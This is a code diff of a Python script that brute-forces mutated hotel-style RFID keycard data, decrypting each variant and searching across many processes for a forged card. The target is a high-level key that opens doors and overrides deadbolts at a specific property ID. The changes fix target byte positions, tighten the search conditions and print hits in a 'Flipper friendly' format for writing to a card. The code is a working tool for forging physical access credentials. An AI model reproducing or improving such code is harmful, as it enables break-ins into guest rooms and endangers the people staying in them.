@@ -1,3 +1,5 @@
+#!/bin/env python
+
 from random import randint
 import multiprocessing
 import time
@@ -43,13 +45,15 @@ KEY_LEVELS = [
     (16, "Primary Programming Key (PPK)"),
 ]
 
+# For the handling multiprocessing
+PRINT_LOCK = multiprocessing.Lock()
+STATUS_QUEUE = multiprocessing.Queue()
 
-def worker(bytes_to_change,print_lock,status_queue,worker_number,minimum_bytes=1):
+def worker(bytes_to_change,worker_number,minimum_bytes=1):
     """
     bytes_to_change: number of bytes to try changing to get a result
     minimum_bytes: by default we change anywhere between 1 and bytes_to_change
         in the ciphertext. This sets a lower bound
-    print_lock: Sync printing for multiprocessing
     worker_number: for housekeeping and printing who found the key (so they can
         get a prize)
     """
@@ -74,13 +78,14 @@ def worker(bytes_to_change,print_lock,status_queue,worker_number,minimum_bytes=1
         cbyte = randint(minimum_bytes, bytes_to_change)
 
         # Don't re-use the same byte numbers
-        available_pos = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]
+        available_pos = [0,1,2,3,4,5,6,7,8,9,10,11,12,13,16]
 
-        # Keep track of what we've picked already (14 here so we can always hit the seq)
-        chosen_pos = []
+        # Keep track of what we've picked already, we can put specific bytes here
+        # if we want to target them for better effect.
+        chosen_pos = [14, 15]
 
         # Pick cbyte random byte positions from the list
-        for _ in range(0,cbyte):
+        for _ in range(0,cbyte - 2):
             # Pick which element of our available_pos to use
             pos = randint(0,len(available_pos) - 1)
             pick = available_pos.pop(pos)
@@ -112,6 +117,7 @@ def worker(bytes_to_change,print_lock,status_queue,worker_number,minimum_bytes=1
         alice = bob & 1 #Even/odd thingy
 
         # Stage 3
+        # I'm using names here to hopefully make it easier to follow than num1, num2, etc.
         for zeta in range(17, 0, -1):
             bob = dc[zeta - 1]
             for xi in range(8, 0, -1):
@@ -126,12 +132,8 @@ def worker(bytes_to_change,print_lock,status_queue,worker_number,minimum_bytes=1
                 dc[yip - 1] = charlie
             dc[zeta - 1] = bob
 
-        # Print the contents of our decrypted array
-        pos = 0
-        for byte in dc:
-            pos += 1
+        # Here's where we figure out what each byte does
 
-        ## Print info ##
         # Byte 0
         key_level_no, key_level_text = KEY_LEVELS[(dc[0] & 0xF0) >> 4]
         led_warning = (dc[0] & 0x08) >> 3
@@ -183,52 +185,57 @@ def worker(bytes_to_change,print_lock,status_queue,worker_number,minimum_bytes=1
         # print("Iteration {}".format(iter_count))
         iter_count += 1
 
-        # keep a count of iterations
+        # keep a count of iterations, I have no clue if this really works
         if iter_count % 1000:
-            status_queue.put(iter_count)
+            STATUS_QUEUE.put(iter_count)
 
+        # Conditions. Modify these to match what you're targeting.
         if (
                 key_level_no == 13 and
-                # interval_month == 0 and 
+                #interval_month == 0 and 
                 interval_year > 1 and 
                 override_deadbolt == 1 and
                 opening_key == 1 and
-                restricted_weekday == 0 and
-                creation_year == 2025 and
-                # sequence_combination_number == (0x0 or 0xfff) and
+                #restricted_weekday == 0 and
+                #creation_year == 2025 and
+                sequence_combination_number == 0xfff and
                 property_id == 1142 and
                 csum_pass
         ):
-            with print_lock:
-                print("KEY FOUND: Proc-> {} Itr->{} Cbyte->{} Pos->{}".format(worker_number,iter_count,cbyte,chosen_pos))
+            # Using print lock so procs don't step on eachother
+            with PRINT_LOCK:
+                # Print the actual contents of the card in Flipper friendly format
+                encoded_output = ""
                 for byte in strCard:
-                    print("{:02x}".format(byte),end=" ")
-                print()
-                # Tell me about yourself
-                print("----KEY INFO----")
-                print("Key Level ({}): {}".format(key_level_no, key_level_text))
-                print("LED Warn: {}".format(led_warning))
-                print("Key ID: 0x{:02x}".format(key_id))
-                print("Opening key: {}".format(opening_key))
-                print("Key Record: {:04x}".format(key_record))
-                print("Seq. combination: 0x{:03x}".format(sequence_combination_number))
-                print("Creation yr. bits: {}".format(creation_year_bits))
-                print("Property ID: {}".format(property_id))
-                print("Override deadbolt: {}".format(override_deadbolt))
-                print("Restricted days (mtwtfss): {:07b}".format(restricted_weekday))
-                print("Valid for (YYYY/MM/DDThm): {:04}/{:02}/{:02}T{:02}:{:02}".format(interval_year, interval_month, interval_day, interval_hour, interval_minute))
-                print("Creation (YYYY/MM/DDThh:mm): {:04}/{:02}/{:02}T{:02}:{:02}".format(creation_year, creation_month, creation_day, creation_hour, creation_minute))
-                print("Checksum: 0x{:02x}".format(checksum))
-                print("Computed checksum: 0x{:02x}".format(csum))
-                print("Checksum pass: {}".format(csum_pass))
-                print("----END KEY INFO----")
+                    encoded_output += f"{byte:02x} "
+
+                message = (
+                    f"KEY FOUND: Proc-> {worker_number} Itr->{iter_count} Cbyte->{cbyte} Pos->{chosen_pos}\n"
+                    f"{encoded_output}\n"
+                    f"----BEGIN KEY INFO----\n"
+                    f"Key Level ({key_level_no}): {key_level_text}\n"
+                    f"LED Warn: {led_warning}\n"
+                    f"Key ID: 0x{key_id:02x}\n"
+                    f"Opening key: {opening_key}\n"
+                    f"Key Record: {key_record:04x}\n"
+                    f"Seq. combination: 0x{sequence_combination_number:03x}\n"
+                    f"Creation yr. bits: {creation_year_bits}\n"
+                    f"Property ID: {property_id}\n"
+                    f"Override deadbolt: {override_deadbolt}\n"
+                    f"Restricted days (mtwtfss): {restricted_weekday:07b}\n"
+                    f"Valid for (YYYY/MM/DDThm): {interval_year:04}/{interval_month:02}/{interval_day:02}T{interval_hour:02}:{interval_minute:02}\n"
+                    f"Creation (YYYY/MM/DDThh:mm): {creation_year:04}/{creation_month:02}/{creation_day:02}T{creation_hour:02}:{creation_minute:02}\n"
+                    f"Checksum: 0x{checksum:02x}\n"
+                    f"Computed checksum: 0x{csum:02x}\n"
+                    f"Checksum pass: {csum_pass}\n"
+                    f"----END KEY INFO----\n"
+                )
+
+                print(message)
 
 if __name__ == "__main__":
     procs = []
-    num_procs = 14
-
-    print_lock = multiprocessing.Lock()
-    status_queue = multiprocessing.Queue()
+    num_procs = 12
 
     print(f"Starting key search with {num_procs} processes...")
 
@@ -237,10 +244,8 @@ if __name__ == "__main__":
         proc = multiprocessing.Process(
             target=worker, kwargs={
                 "bytes_to_change": 8,
-                "minimum_bytes": 4,
-                "print_lock": print_lock,
+                "minimum_bytes": 5,
                 "worker_number": pnum,
-                "status_queue": status_queue,
         })
         procs.append(proc)
         proc.start()
@@ -251,9 +256,9 @@ if __name__ == "__main__":
         start_time = time.time()
         while True:
             time.sleep(10)
-            while not status_queue.empty():
+            while not STATUS_QUEUE.empty():
                 try:
-                    stat = status_queue.get(block=False)
+                    stat = STATUS_QUEUE.get(block=False)
                     total_iterations += stat
                 except queue.Empty:
                     break
